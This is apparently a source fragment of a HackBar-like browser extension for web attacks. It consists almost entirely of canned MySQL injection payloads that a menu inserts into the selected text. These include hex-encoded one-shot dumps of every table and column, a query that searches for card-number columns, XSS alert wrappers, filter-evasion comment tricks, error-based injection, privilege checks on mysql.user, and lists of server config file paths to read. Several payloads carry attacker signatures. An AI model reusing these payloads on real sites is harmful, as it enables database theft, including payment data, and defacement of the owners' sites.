						txt = "concat(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,concat(concat(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69656e205368616e753a3a203c2f666f6e743e3c2f63656e7465723e3c2f623e),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),concat(0x3c62723e3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c62723e546f74616c205461626c657320496e20416c6c20446174616261736573203a3a20,(select count(*) from information_Schema.tables),0x3c62723e5461626c657320436f756e7420496e205072696d617279204461746162617365203a3a20,(Select count(*) from information_Schema.tables where table_schema=database()),(select(@x)from(select(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(select(0) from(information_schema.columns)where(table_schema=database()) and(0x00)in(@x:=Concat(@x, 0x3c62723e, if( (@tbl!=table_name), Concat(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,LPAD(@r:=@r%2B1, 2, 0x30),0x2e,@tbl:=table_name,0x3c666f6e7420636f6c6f723d626c61636b3e203a3a20436f6c756d6e7320496e2054686973205461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@tbl),0x20284461746162617365203a3a20,database(),0x29,0x3c2f666f6e743e,0x3c62723e), 0x00),0x203a3a20,0x3c666f6e7420636f6c6f723d677265656e2073697a653d323e,0x7e20,column_name,0x3c2f666f6e743e ))))x))))";
					break;
			case 'SK6':
						txt = "concat(0x416c69656e205368616e753a3a3a3a20,version(),0x3c62723e446220636f756e74203a3a20,(select count(*) from information_schema.schemata),0x3c62723e5461626c657320636f756e7420696e20696e666f726d6174696f6e20736368656d61203a3a20,(select count(*) from information_schema.tables where table_schema=0x696e666f726d6174696f6e5f736368656d61),(select(@a)from(select(@a:=0x00),(select(@a) from (information_schema.tables)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@a:=concat(@a,0x3c62723e7461626c65206e616d653a3a20,@tbl:=table_name,0x3a3a20636f6c756d6e7320636f756e7420696e2074686973207461626c652061726520203a3a20,(select(count(*))from(information_schema.columns)where(table_name=@tbl))))))a)";
					break;
			case 'SK7':
						txt = "concat(0x3c62723e3c666f6e7420636f6c6f723d7265642073697a653d35203e202121496e6a656374656420427920416c69656e205368616e7521213c2f666f6e743e,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e56455253494f4e3a2d3c2f666f6e743e,version(),0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e555345523a2d3c2f666f6e743e,user(),0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e44415441424153453a2d3c2f666f6e743e,database(),0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e555549443a2d3c2f666f6e743e,uuid(),0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e424153454449523a3c2f666f6e743e,@@basedir,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e484f53544e414d453a2d3c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e504f52543a2d3c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e53594d4c494e4b3a2d3c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e4f533a2d3c2f666f6e743e,@@version_compile_os,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e424954532044455441494c3a2d3c2f666f6e743e,@@VERSION_COMPILE_MACHINE,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d33203e46494c452053595354454d3a2d3c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM)";
					break;
			case 'SK8':
						txt = "CONCAT(0x7e223e3c62723e3c62723e3c62723e3c62723e3c2f62723e,0x3c2f74723e3c7461626c653e,0x3c666f6e742020636f6c6f723d22707572706c65223e3c68746d6c20353e3c62723e3c623e3c693e3c666f6e7420636f6c6f723d677265656e3e416c69656e205368616e75203c2f666f6e743e3a3a203c666f6e7420636f6c6f723d707572706c65652c63757272656e745f646174652829,0x3c2f666f6e743e,0x3c6f6c2073746172743d2231223e,(SELECT(@xy)FROM(SELECT(@xy:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@xy:=CONCAT(@xy,0x3c6c693e,@xyz:=table_name,0x3c2f666f6e743e3c666f6e7420636f6c6f723d22677265656e223e202b4e6f204f6620436f6c756d6e73203d20,(select count(column_name) from information_schema.columns where table_name=@xyz),0x3c666f6e7420636f6c6f723d6d6167656e74613e207e7e546f74616c205265636f72643d20,ifnull(table_rows,0),0x3c666f6e7420636f6c6f723d626c75653e207e7e53697a65206f6620446174613d20,(data_length),0x203c666f6e7420636f6c6f723d7265643e423c2f666f6e743e,0x3c2f666f6e743e3c666f6e7420636f6c6f723d22707572706c65223e,0x3c2f6c693e))))xy))";
			        break;
			case 'SK9':
						txt = "/*!50000concat*/(0x3c666f6e7420636f6c6f723d626c61636b2073697a653d343e3c623e2a2a20496e6a656374656420427920416c69656e205368616e75202a2a2a3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e2073697a653d343e3c623e446174616261736520bb20,database(),0x20ab,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e5573657220bb20,user(),0x20ab,0x3c2f666f6e743e,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c652073697a653d343e3c623e56657273696f6e20bb20,version(),0x20ab,0x3c2f666f6e743e,0x3c62723e,(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a))";
					break;
			case 'SK10':
						txt = "/*!50000cOnCat*/(0x3c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x2f2a496e6a656374656420427920416c69656e205368616e752a2f,0x3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(`information_schema`.`columns`)where@:=make_set(511,@,table_name,0x3e3e,column_name,0x3c42523e)),@))";				
					break;
			case 'SK11':
						txt = "concat/*!%28unhex%28hex%28concat/*!%280x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex%28hex%28%20concat/*!%280x3c63656e7465723e3c666f6e7420636f6c6f723d477265656e2073697a653d343e3c623e7e7e7e3a3a3a3a3a496e6a656374656420627920416c69204b68616e3a3a3a3a3a7e7e7e3c62723e3c666f6e7420636f6c6f723d7265643e284e4f4f42293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e%29%29%29,%200x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,%20version%28%29,0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database%28%29,0x3c62723e44617461626173652055736572203a3a20,user%28%29,%20%28/*!12345selEcT*/%28@x%29/*!from*/%28/*!12345selEcT*/%28@x:=0x00%29,%28@r:=0%29,%28@running_number:=0%29,%28@tbl:=0x00%29,%28/*!12345selEcT*/%280%29%20from%28information_schema./**/columns%29where%28table_schema=database%28%29%29%20and%280x00%29in%28@x:=Concat/*!%28@x,%200x3c62723e,%20if%28%20%28@tbl!=table_name%29,%20Concat/*!%280x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,%20LPAD%28@r:=@r%2b1,%202,%200x30%29,0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database%28%29,%200x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e%29,%200x00%29,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD%28@running_number:=@running_number%2b1,3,0x30%29,0x2e20,0x3c2f666f6e743e,%200x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e%29%29%29%29x%29%29%29%29%29*/";
					break;		
			case 'SK12':
                        txt = "concat(0x3c62723e3c62723e3c62723e3c62723e,0x416c69656e205368616e753a3a3a,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x3e3e3e,table_name,0x3a3a3a3a,column_name))))x))";
                    break;
		  
		    case 'AHD1':
						txt = "concat(0x3c7363726970743e616c6572742822496e6a656374656420427920416c69204b68616e,0x5c6e,0x56657273696f6e203a3a20,version(),0x5c6e,0x4461746162617365203a3a20,database(),0x5c6e,0x55736572203a3a20,user(),0x5c6e,(select group_concat(table_name,0x3a3a3a3a,column_name+separator+0x5c6e) from information_schema.columns where table_schema=database()),0x5c6e,0x22293c2f7363726970743e)";
					break;
			case 'AHD2':
						txt = "/*!00000concat*/(0x3c7363726970743e616c6572742822496e6a65637465642b585353454420627920416c69656e205368616e753a3a,0x5c6e,version(),0x5c6e,database(),0x5c6e,user(),0x5c6e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20";
					break;
			case 'AHD3':
						txt = "concat/*%00*/%28%27%3C/title%3E%27,%27%3Cb%3E%3Ci%3E%3Cfont%20color=purple%3E%27,%27%3Ch1%3E%27,%27%20Injected by Alien Shanu%3Cbr%3EThanks For the Challenge%20%27,%27%3C/h1%3E%27,%27%3Cbr%3E%27,%27user+:::::::::+%27,user%28%29,%27%3Cbr%3E%27,%27Version+:::::::::+%27,version%28%29,%27%3Cbr%3E%27,%27DB+:::::::::+%3Cbr%3E%27,database%28%29,%27%3Cbr%3E%27,%27%3Cbr%3E%27,%28select+group_concat%28%27%3Cli%3E%27,table_name,%27%20::::::%20%27,column_name+separator+%27%3Cbr%3E%27%29+from+information_schema.columns+where+table_schema!=%27information_schema%27%29%29";
					break;
			case 'AHD4':
						txt = "and(select!x-~0.+from(select(concat(0x3c62723e494e4a454354454420425920414c49454e205348414e55,0x3c62723e,0x56455253494f4e203a3a20,VERSION(),0x3c62723e,0x4441544142415345203a3a20,DATABASE(),0x3c62723e,0x55534552203a3a20,USER(),0x3c62723e,0x3c62723e,(select group_concat(table_name,0x3a,column_name,0x3c62723e) from information_schema.columns where table_schema=database())))x)a)-- -";
					break;
			case 'AHD5':
						txt = "exp(~(select * from (select database())abc))";
					break;
			case 'AHD6':
						txt = "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)";
					break;
					
			case 'An0n':
						txt = "/*!50000concat*/(/*!50000concat*/(0x3c616464726573733e3c6120687265663d2268747470733a2f2f7777772e616c69656e706f7374732e636f6d223e212121414c49454e205348414e5520486552652121213c63656e7465723e3c696d67207372633d22687474703a2f2f312e316d2e79742f365661383936562e676966223e3c62723e3c2f613e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a65637465642062792022416c69656e205368616e75223c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d20236633643933613e204461746162617365207e3e3e203c2f666f6e743e,database(),0x3c62723e3c666f6e743e3c666f6e7420636f6c6f723d20233066396439363e2056657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e,0x3c666f6e743e203c666f6e7420636f6c6f723d20233066373639643e2055736572207e3e3e203c2f666f6e743e,user(),0x3c62723e,0x3c666f6e743e3c666f6e7420636f6c6f723d20233066396433653e20506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e,0x3c666f6e743e3c666f6e7420636f6c6f723d20233464356137333e204f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x3c62723e,0x3c666f6e743e203c666f6e7420636f6c6f723d20233661343437323e2044617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e,0x3c666f6e743e203c666f6e7420636f6c6f723d20233331303433623e2055554944207e3e3e203c2f666f6e743e,UUID(),0x3c62723e,0x3c666f6e743e3c666f6e7420636f6c6f723d20233639303436373e2043757272656e742055736572207e3e3e203c2f666f6e743e,current_user(),0x3c62723e,0x3c666f6e743e3c666f6e7420636f6c6f723d20233834323038313e2054656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e,0x3c666f6e743e3c666f6e7420636f6c6f723d20233963366239343e20424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e,0x3c666f6e743e203c666f6e7420636f6c6f723d20233966306138383e2046494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e,0x3c62723e,0x3c666f6e743e203c666f6e7420636f6c6f723d20233932343235643e2020486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e203c666f6e743e3c666f6e7420636f6c6f723d20233934303133333e2053797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID(),0x3c62723e203c666f6e743e3c666f6e7420636f6c6f723d20236133323635313e2053796d204c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e203c666f6e743e203c666f6e7420636f6c6f723d20233538306331393e2053534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e203c666f6e743e203c666f6e7420636f6c6f723d20233939316633333e2042617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c666f6e742073697a653d223570782220636f6c6f723d22426c61636b223e2047726565747a20546f207e20203c2f666f6e743e3c62723e3c6d6172717565652077696474683d22383025223e202a2042656e7a692042726f202a207c202a204768617a696620416465656d2042726f202a207c20202a20556d65722041686d65642042726f202a207c202a205261746e61205365686b61722042726f202a207c202a2048617373616e20417161667565202a207c202a20416264756c6c61682042726f202a207c202a2054616c68612042726f202a207c202a205361696b61742042726f202a207c202a204a616e75732042726f202a207c202a20416e6f6e204861726973202a207c202a2044656c7761722042726f202a207c202a204e757220446970752042726f202a207c202a204b617a616d2047756a6a61722042726f7c2026207c202a205468616e6b7320466f722044696f7320556d61722041726665656e20536861682a207c3c2f6d6172717565653e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e3c696672616d65207372633d2268747470733a2f2f7777772e796f75747562652e636f6d2f656d6265642f31695830646b52686a37673f72656c3d30266175746f706c61793d312220616c6c6f7766756c6c73637265656e3d2222206672616d65626f726465723d223022206865696768743d2230222077696474683d2230223e3c2f696672616d653e,(select(@a)from(select(@a:=0x00),(select(@a)from(/*!50000information_schema*/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!50000concat+++++*/(@a,table_name,0x3c666f6e7420636f6c6f723d22726564223e20202d2d2d3e203c2f666f6e743e,column_name,0x3c62723e))))a)))";
					break;		
				
            case 'Exorcism 1':
						txt = "/*!12345make_set*/(6,@:=0x0a,(select(1)/*!12345from*/(/*!12345information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!12345table_name*/,/*!12345column_name*/)),@)";
					break;
					
            case 'Exorcism 2':
						txt = "make_set(6,@:=0x0a,(select(1)from(/*!50000information_schema.columns*/)where@:=make_set(511,@,0x3c6c693e,/*!50000table_name*/,/*!50000column_name*/)),@),﻿";
					break;

			case 'DUMP_CARD':
					txt = "(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.­tables) where (0x00) in (@x:=concat(@x,0x3c6­2723e,@tbl:=table_na­me,(Select CASE WHEN ( (select count(*) from information_schema.c­olumns where table_name=@tbl and column_name like 0x25636172646e756d62­657225)>0) THEN 0x3c666f6e7420636f6c­6f723d677265656e3e3c­623e202a2a2a20636172­646e756d626572202a2a­2a203c2f623e3c666f6e­7420636f6c6f723d626c75653e else 0x00 END)))))x)";
					break;
			case 'MID_SEPARATOR':
					txt = "(select+MID(GROUP_CO­NCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.t­ables) SEPARATOR 0x3c62723e),1,1024)+­FROM information_schema.c­olumns)";
					break;
			case 'Reverse':
					txt = "reverse(insert(0x1,1­,0,reverse(unhex(hex­(table_name))))) FROM information_schema 0.e.tables limit 1,1 reverse(insert(0x1,1­,0,reverse(concat(unhex(hex(table_nam­e)),0x203a20,unhex(h­ex(column_name)),0x3­c62723e)))) from information_schema 0.e.columns limit 1,1";
					break;
			case 'Benchmark':
					txt = "concat(@i:=0×00,@o:=0xd0a,benchmark(40,@o:=CONCAT(@o,0xd0a​,(SELECT concat(table_schema,0x2E,@i:=table_name) FROM information_schema.tables WHERE table_name>@i order by table_name LIMIT 1))),@o)";
					break;	
					
					
					
	
			

		    //conver using ascii
			case 'ascii': var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat(" + value + ")+using+ascii)";
				 break;

		    //conver using binary
			case 'conver_binary': var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat(" + value + "),binary)";
				 break;


	       //conver using substring			
			case 'substring 1':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "substring(concat("+value+"),1,1)=4";
				 break;
			case 'substring 2':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "substring(concat("+value+"),1,1)=5";
				 break;
			case 'substring 3':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "substring(concat("+value+"),1,1)=9";
				 break;
			case 'substring 4':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "substring(concat("+value+"),1,1)=10";
				 break;

		    //conver using latin
			case 'latin 1':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat("+value+")+USING+latin1)";
				 break;
			case 'latin 2':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat("+value+")+USING+latin2)";
				 break;
			case 'latin 3':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat("+value+")+USING+latin3)";
				 break;
			case 'latin 4':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat("+value+")+USING+latin4)";
				 break;
			case 'latin 5':var value = prompt( "Please Enter the value of convert statement", "version()" );
				 txt = "CONVERT(concat("+value+")+USING+latin5)";
				 break;		
				 
			//0xHTML
		  case 'br':
			 txt = "0x3c62723e";
					break;
		  case 'br2':
			 txt = "0x3c62723e3c62723e";
					break;
		  case 'slashN':
			 txt = "0x5c6e";
					break;
		  case 'separatorbr':
			 txt = "SEPARATOR+0x3c62723e";
					break;
		  case 'li':
			 txt = "0x3c6c693e";
					break;
		  case 'b':
			 txt = "0x3c623e";
					break;
		  case 'cb':
			 txt = "0x3c2f623e";
					break;
		  case 'fontfc':
			 txt = "0x3c666f6e7420666163653d636f75726965723e";
					break;
		  case 'fontred':
			 txt = "0x3c666f6e7420636f6c6f723d7265643e";
					break;
		  case 'fontblue':
			 txt = "0x3c666f6e7420636f6c6f723d626c75653e";
					break;
		  case 'fontgreen':
			 txt = "0x3c666f6e7420636f6c6f723d677265656e3e";
					break;
		  case 'fontpurple':
			 txt = "0x3c666f6e7420636f6c6f723d707572706c653e";
					break;
		  case 'fontmagenta':
			 txt = "0x3c666f6e7420636f6c6f723d6d6167656e74613e";
					break;
		  case 'customcolor':
		  	var customcolor = prompt("Please Enter custom color","cyan");
		  	var font = "<font color="+customcolor+">";
		  	var charStringArray = new Array;
		    var decimal;
		    for ( var c = 0; c < font.length; c++ ) {
		      decimal = font.charCodeAt( c );
		      charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );
		    }
			txt = "0x" + charStringArray.join( '' );
					break;
		  case 'fontc':
			 txt = "0x3c2f666f6e743e";
					break;
		  case 'imglogo':
		  	var imagelink = prompt("Please Enter image link","https://imgur.com/r8DpLDe.gif");
		  	var image = "<img src=" + imagelink + ">";
		  	var charStringArray = new Array;
		    var decimal;
		    for ( var c = 0; c < image.length; c++ ) {
		      decimal = image.charCodeAt( c );
		      charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );
		    }
			 txt = "0x" + charStringArray.join( '' );
					break;
		  case 'div':
			 txt = "0x3c6469763e";
					break;
		  case 'divc':
			 txt = "0x3c2f6469763e";
					break;
		  case 'marquee':
			 txt = "0x3c6d6172717565653e";
					break;
		  case 'marqueec':
			 txt = "0x3c2f6d6172717565653e";
					break;
		  case 'title':
			 txt = "0x3c2f7469746c653e";
					break;
		  case 'imgc':
			 txt = "0x3c2f696d673e";
					break;
		  case '':
			 txt = "0x3c2f613e";
					break;
		  case 'a':
			 txt = "0x3c2f613e";
					break;
		  case 'p':
			 txt = "0x3c2f703e";
					break;
		  case 'sourcetag':
			 txt = "0x223e";
					break;
		  case 'sourcetag1':
			 txt = "0x273e";
					break;
		  case 'tagc':
			 txt = "0x2f3e";
					break;
		  case 'ctagwithslash':
			 txt = "0x222f3e";
					break;
		  case 'ccomment':
			 txt = "0x2d2d3e";
					break;
		}
		hackBar.setSelectedText( txt );
	  },
/* PESCYTE STATEMENTS FUNCTION */
      statementspescyte: function (choice)	{
		var str = choice;
		switch (str){
			/*LINUX DIR*/
			case 'linux1':
						txt = "/var/www/html/";
					break;
			case 'linux2':
						txt = "/var/www/web1/html/";
					break;
			case 'linux3':
						txt = "/var/www/sitename/htdocs/";
					break;
			case 'linux4':
						txt = "/var/www/localhost/htdocs";
					break;
			case 'linux5':
						txt = "/var/www/vhosts/sitename/httpdocs/";
					break;
			case 'linux6':
						txt = "/etc/init.d/apache2";
					break;
			case 'linux7':
						txt = "/etc/httpd/httpd.conf";
					break;
			case 'linux8':
						txt = "/etc/apache/apache.conf";
					break;
			case 'linux9':
						txt = "/etc/apache/httpd.conf";
					break;
			case 'linux10':
						txt = "/etc/apache2/apache2.conf";
					break;
			case 'linux11':
						txt = "/etc/apache2/httpd.conf";
					break;
			case 'linux12':
						txt = "/usr/local/apache2/conf/httpd.conf";
					break;
			case 'linux13':
						txt = "/usr/local/apache/conf/httpd.conf";
					break;
			case 'linux14':
						txt = "/opt/apache/conf/httpd.conf";
					break;
			case 'linux15':
						txt = "/home/apache/httpd.conf";
					break;
			case 'linux16':
						txt = "/home/apache/conf/httpd.conf";
					break;
			case 'linux17':
						txt = "/etc/apache2/sites-available/default";
					break;
			case 'linux18':
						txt = "/etc/apache2/vhosts.d/default_vhost.include";
					break;
			case 'linux19':
						txt = "/templates_compiled/";
					break;
			case 'linux20':
						txt = "/templates_c/";
					break;
			case 'linux21':
						txt = "/temporary/";
					break;
			case 'linux22':
						txt = "/images/";
					break;
			case 'linux23':
						txt = "/files/";
					break;
			case 'linux24':
						txt = "/temp/";
					break;
			case 'linux25':
						txt = "/etc/httpd/conf/httpd.conf";
					break;
			/*WINDOWS DIR*/
			case 'windows26':
						txt = "C:/XAMPP/apache/conf/extra/httpd-vhost.conf";
					break;
			case 'windows27':
						txt = "C:/AppServ/Apache2.2/conf/extra/httpd-vhosts.conf";
					break;
			case 'windows28':
						txt = "C:/xampp/apache/conf/httpd.conf";
					break;
			case 'windows29':
						txt = "C:/AppServ/Apache2.2/conf/httpd.conf";
					break;
			case 'windows30':
						txt = "C:/wamp/bin/apache/apache2.4.9/conf/extra/httpd-vhosts.conf";
					break;
			case 'windows31':
						txt = "C:/wamp/bin/apache/Apache2.2.11/conf/extra/httpd-vhosts.conf";
					break;
			case 'windows32':
						txt = "C:/Program Files/Ampps/apache/conf/extra/httpd-vhosts.conf";
					break;
			case 'windows33':
						txt = "C:/Program Files (x86)/Ampps/apache/conf/extra/httpd-vhosts.conf";
					break;
		}
		hackBar.setSelectedText( txt );
	  },
/* SYS VARIABLES */
      SysVariables: function (choice)	{
		var str = choice;
		switch (str){
// VERSION
			case 'sys ver1': txt = "VERSION()";
					break;
			case 'sys ver2': txt = "@@VERSION";
					break;

			case 'sys ver3': txt = "@@GLOBAL.VERSION";
					break;
			case 'sys ver4': txt = "@@VERSION_COMMENT";
					break;
// USER
			case 'sys user5': txt = "USER()";
					break;
			case 'sys user6': txt = "CURRENT_USER()";
					break;
			case 'sys user7': txt = "SYSTEM_USER()";
					break;
			case 'sys user8': txt = "SESSION_USER()";
					break;
			case 'sys user9': txt = "SUBSTRING_INDEX(USER(),0x40,1)";
					break;
			case 'sys user10': txt = "(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;
// DATABASE
			case 'sys db11': txt = "DATABASE()";
					break;
			case 'sys db12': txt = "SCHEMA()";
					break;
			case 'sys db13': txt = "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;
// SQL BASICS /SYSYTEM VARIABLES / MYSQL /GET SERVER FOLDER

			case 'Get Server Folders1': txt = "@@CHARACTER_SETS_DIR";
					break;
			case 'Get Server Folders2': txt = "@@LOG_ERROR";
					break;
			case 'Get Server Folders3': txt = "@@LANGUAGE";
					break;
			case 'Get Server Folders4': txt = "@@PID_FILE";
					break;
			case 'Get Server Folders5': txt = "@@PLUGIN_DIR";
					break;
			case 'Get Server Folders6': txt = "@@SOCKET";
					break;
			case 'Get Server Folders7': txt = "@@BASEDIR";
					break;
			case 'Get Server Folders8': txt = "@@DATADIR";
					break;
			case 'Get Server Folders9': txt = "@@SLAVE_LOAD_TMPDIR";
					break;

// SQL BASICS /SYSYTEM VARIABLES / MYSQL /CHARSET

            case 'charset1': txt = "@@CHARACTER_SET_CLIENT";
					break;
			case 'charset2': txt = "@@CHARACTER_SET_CONNECTION";
					break;
			case 'charset3': txt = "@@CHARACTER_SET_DATABASE";
					break;
			case 'charset4': txt = "@@CHARACTER_SET_FILESYSTEM";
					break;
			case 'charset5': txt = "@@CHARACTER_SET_SERVER";
					break;


// OTHER MySQL

			case 'OTHERMYSQL1': txt = "IF((@@LOWER_CASE_TABLE_NAMES)=0,0x594553,0x4e4f)";
					break;
			case 'OTHERMYSQL2': txt = "IF((@@LOWER_CASE_FILE_SYSTEM)=0,0x594553,0x4e4f)";
					break;
			case 'OTHERMYSQL3': txt = "@@COLLATION_CONNECTION";
					break;
			case 'OTHERMYSQL4': txt = "@@HOSTNAME";
					break;
			case 'OTHERMYSQL5': txt = "@@HAVE_INNODB";
					break;
			case 'OTHERMYSQL6': txt = "@@FT_BOOLEAN_SYNTAX";
					break;
			case 'OTHERMYSQL7': txt = "@@PORT";
					break;
			case 'OTHERMYSQL8': txt = "@@MYISAM_RECOVER_OPTIONS";
					break;
			case 'OTHERMYSQL9': txt = "@@VERSION_COMPILE_OS";
					break;
			case 'OTHERMYSQL10': txt = "@@VERSION_COMPILE_MACHINE";
					break;
			case 'OTHERMYSQL11': txt = "@@HAVE_OPENSSL";
					break;
			case 'OTHERMYSQL12': txt = "@@HAVE_SYMLINK";
					break;
			case 'OTHERMYSQL13': txt = "@@CONNECT_TIMEOUT";
					break;
			case 'OTHERMYSQL14': txt = "@@WAIT_TIMEOUT";
					break;





// Privileges check

			case 'Privileges check1': txt = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
					break;
			case 'Privileges check2': txt = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
					break;
			case 'Privileges check3': txt = "(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
					break;
		}
		hackBar.setSelectedText( txt );
	  },
	  /* T.PRO CONVERSATION FUNCTIONS */
      statementsCalcTpro: function (choice)	{
		var txt = hackBar.getSelectedText();
		var str = choice;
		switch (str){
			case '1':  txt = "";
					break;
			case '2': txt = "unhex(hex(" + txt + "))";
					break;
			case '3': txt = "cast(" + txt + ")";
					break;
			case '4': txt = "uncompress(compress(" + txt + "))";
					break;
            default:
                    txt = "ERROR";
                    break;
		}
		hackBar.setSelectedText( txt );
	  },
	  binary: function ( encoding )
	  {
	    var value = prompt( "Please Enter the value", "version()" );
	    var txt = "binary(" + value + ")";
	    hackBar.setSelectedText( txt );
	  },
	  aes_decrypt: function ( encoding )
	  {
	    var value = prompt( "Please Enter the value", "version()" );
	    var txt = "aes_decrypt(aes_encrypt(" + value + ",1),1)";
	    hackBar.setSelectedText( txt );
	  },
	  reverse: function ( encoding )
	  {
	    var originalString = prompt("Please Enter the value and automatically reversed the value","concat");
		var splitext = originalString.split("");
		var revertext = splitext.reverse();
		var reversed = revertext.join("");
		var txt = "reverse(" + reversed + ")";
	    hackBar.setSelectedText( txt );
	  },
      /* T.PRO COMMENT FUNCTION */
      commentsTpro: function (choice)	{
		var txt = hackBar.getSelectedText();
		var str = choice;
		switch (str){
			case '1': txt = txt.replace(/\/\*\*\//g, "+");
